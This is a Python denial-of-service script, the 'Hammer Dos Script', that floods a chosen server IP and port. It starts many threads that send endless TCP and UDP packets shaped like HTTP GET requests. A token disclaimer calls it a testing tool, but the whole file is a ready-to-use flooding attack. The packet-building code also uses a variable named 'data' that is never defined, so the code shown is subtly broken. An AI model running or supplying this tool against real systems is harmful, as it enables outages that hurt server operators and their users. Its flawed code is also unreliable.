#!/usr/bin/python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, random

def user_agent():
    global uagent
    uagent=[]
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    return(uagent)

def dos_tcp():
    while True:
        item = q.get()
        down_it_tcp(item)
        q.task_done()

def dos_udp():
    while True:
        item = w.get()
        down_it_udp(item)
        w.task_done()

def usage():
    print (''' \033[92m Hammer Dos Script v.1 http://www.canyalcin.com/
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your ip is visible. \n
    usage : python3 hammer.py [-s] [-p] [-t]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 135 \033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False,epilog="Hammers")
    optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
    optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
    optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

def down_it_tcp(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,int(port)))
            if s.sendto( packet, (host, int(port)) ):
                s.shutdown(1)
                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(.1)

def down_it_udp(item):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            if s.sendto(packet, (host, int(port))):
                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                print("\033[91mshut<->down\033[0m")
            s.close()
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(.1)

# Main program starts here
if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    user_agent()
    get_parameters()
    print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
    print("\033[94mPlease wait...\033[0m")

    # Initialize the task queue for TCP and UDP
    q = Queue()
    w = Queue()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server ip and port\033[0m")
        sys.exit()

    # Create threads for TCP and UDP tasks
    for i in range(int(thr)):
        t = threading.Thread(target=dos_tcp)
        t.daemon = True
        t.start()

        t2 = threading.Thread(target=dos_udp)
        t2.daemon = True
        t2.start()

    start = time.time()
    item = 0
    while True:
        if (item>1800): # for no memory crash
            item=0
            time.sleep(.1)
        item = item + 1
        q.put(item)
        w.put(item)

    q.join()
    w.join()